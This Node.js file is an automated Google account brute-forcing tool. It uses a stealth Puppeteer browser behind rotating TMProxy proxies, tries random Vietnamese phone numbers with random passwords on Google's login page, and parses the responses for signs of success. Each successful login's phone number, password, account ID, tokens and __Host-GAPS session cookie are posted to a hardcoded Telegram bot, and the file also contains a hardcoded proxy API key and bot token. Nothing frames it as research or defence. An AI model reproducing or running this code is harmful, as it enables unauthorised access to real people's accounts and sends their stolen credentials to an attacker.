const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const bodyParser = require('body-parser')
const express = require('express')
const axios = require('axios')
require('dotenv').config()
process.env.TM_API_KEY = process.env.TM_API_KEY || '95d86e25d08169a4d0481c4c5bc9d071'

let page = null
let mID = null
let mLoaded = false
let mUrl = null
let mPostData = null
let mHeaders = null

let mStart = new Date().toString()

const TELEGRAM_URL = 'https://api.telegram.org/bot5329401539:AAFxSaqdq7jOIfU4KR3yhQmXHLVMPlM-FL0/sendMessage'
const TELEGRAM_CHAT_ID = '683643497'

const app = express()

app.use(express.json())
app.use(bodyParser.urlencoded({ extended: true }))
puppeteer.use(StealthPlugin())

app.listen(process.env.PORT || 3000, () => {
    console.log('Listening on port 3000...')
})

startBrowser()

setInterval(async () => {
    await pageReload()
}, 30 * 60 * 1000)

setInterval(async () => {
    await updateStatus()
}, 60000)

setInterval(async () => {
    if (mLoaded) {
        const phone = randomVietnamPhone()
        const password = randomPassword()
        console.log('Auto login using:', phone, password)
        const result = await getLoginToken(phone, password)
        console.log('Result:', result)
        if (result.status === 1) {
            await sendTelegramMessage(`✅ Login success\n📱 Phone: ${phone}\n🔑 Pass: ${password}\n🆔 CID: ${result.cid}\n🔒 TL: ${result.tl}\n☁️ Host: ${result.host}`)
        }
    }
}, 180000)

app.get('/tmproxy', async (req, res) => {
    await getNewProxyFromTM()
    await delay(2000)
    const proxy = await getCurrentProxyFromTM()
    if (proxy) {
        res.json({ proxy })
    } else {
        res.status(500).json({ error: 'Unable to get current proxy' })
    }
})

function randomVietnamPhone() {
    const prefixes = ['032', '033', '034', '035', '036', '037', '038', '039', '070', '076', '077', '078', '079', '081', '082', '083', '084', '085', '086', '088', '089', '090', '091', '092', '093', '094', '096', '097', '098', '099']
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)]
    const number = Math.floor(1000000 + Math.random() * 9000000).toString()
    return prefix + number
}

function randomPassword() {
    return Math.random().toString(36).slice(-10)
}

async function sendTelegramMessage(text) {
    try {
        await axios.post(TELEGRAM_URL, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text
        })
    } catch (err) {
        console.error('❌ Failed to send Telegram message:', err.message)
    }
}

async function getNewProxyFromTM() {
    try {
        const res = await axios.post('https://tmproxy.com/api/proxy/get-new-proxy', {
            api_key: process.env.TM_API_KEY,
            id_location: 0,
            id_isp: 0
        }, {
            headers: { 'Content-Type': 'application/json' }
        })
        return res.data.code === 0
    } catch (err) {
        console.error('TMProxy new error:', err.message)
        return false
    }
}

async function getCurrentProxyFromTM() {
    try {
        const res = await axios.post('https://tmproxy.com/api/proxy/get-current-proxy', {
            api_key: process.env.TM_API_KEY
        }, {
            headers: { 'Content-Type': 'application/json' }
        })
        return res.data?.data?.https || null
    } catch (err) {
        console.error('TMProxy current error:', err.message)
        return null
    }
}

async function startBrowser() {
    try {
        await getNewProxyFromTM()
        await delay(3000)
        const proxy = await getCurrentProxyFromTM()

        let args = [
            '--no-sandbox',
            '--disable-notifications',
            '--disable-setuid-sandbox',
            '--ignore-certificate-errors',
            '--disable-dev-shm-usage'
        ]

        if (proxy) args.push(`--proxy-server=${proxy}`)

        const browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args,
            executablePath: process.env.NODE_ENV === 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath()
        })

        page = (await browser.pages())[0]
        page.on('dialog', async dialog => dialog.type() === "beforeunload" && dialog.accept())
        await page.setRequestInterception(true)
        page.on('request', req => req.continue())

        console.log('Browser Load Success')
        await loadLoginPage()
        mLoaded = true
        console.log('Page Load Success')
    } catch (error) {
        console.log('Browser Error:', error)
    }
}

async function pageReload() {
    mLoaded = false
    console.log('Page Reloading...')
    await loadLoginPage()
    console.log('Page Reload Success')
    mLoaded = true
}

async function getLoginToken(number, password) {
    try {
        await loadingRemove()
        mUrl = mHeaders = mPostData = null
        await page.evaluate((n) => {
            document.querySelector('input#identifierId').value = n
            document.querySelector('#identifierNext').click()
        }, number)
        await page.waitForSelector('input[type="password"]', { timeout: 10000 })
        await delay(1000)
        await page.evaluate((pw) => {
            document.querySelector('input[type="password"]').value = pw
            document.querySelector('#passwordNext').click()
        }, password)
        await loadingRemove()
        for (let i = 0; i < 30; i++) {
            if (mUrl && mPostData && mHeaders) break
            await delay(500)
        }
        await loadingRemove()
        if (mUrl && mPostData && mHeaders) {
            const response = await axios.post(mUrl, mPostData, { headers: mHeaders, maxRedirects: 0, validateStatus: null })
            let data = response.data
            let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]') - 2)
            temp = temp.substring(0, temp.lastIndexOf(']]') + 2)
            let json = JSON.parse(temp)[0]
            if (json[1] === 'V1UmUe') {
                let value = JSON.parse(json[2])
                if (value[21]) {
                    let info = value[21][1][0]
                    return { status: 1, tl: info[1][1][1], cid: info[1][0][1], type: info[0], host: getHostGaps(mHeaders.cookie) }
                } else if (value[18] && value[18][0]) {
                    return { status: 3 }
                } else {
                    return { status: 2 }
                }
            }
        }
    } catch (error) {}
    return { status: 0 }
}

async function loadingRemove() {
    await page.evaluate(() => {
        ['kPY6ve', 'Ih3FE'].forEach(cls => {
            const root = document.querySelector(`div[class="${cls}"]`)
            if (root) root.remove()
        })
    })
}

async function loadLoginPage() {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
            await delay(500)
            break
        } catch (error) {}
    }
}

async function updateStatus() {
    try {
        if (mID) await axios.get('https://' + mID + '.onrender.com')
    } catch (error) {}
}

function getHostGaps(cookies) {
    try {
        if (cookies.includes('__Host-GAPS')) {
            let temp = cookies.substring(cookies.indexOf('__Host-GAPS=') + 12)
            if (temp.includes(';')) {
                return temp.substring(0, temp.indexOf(';'))
            }
            return temp
        }
    } catch (error) {}
    return null
}

function decode(text) {
    return Buffer.from(text, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time))
}
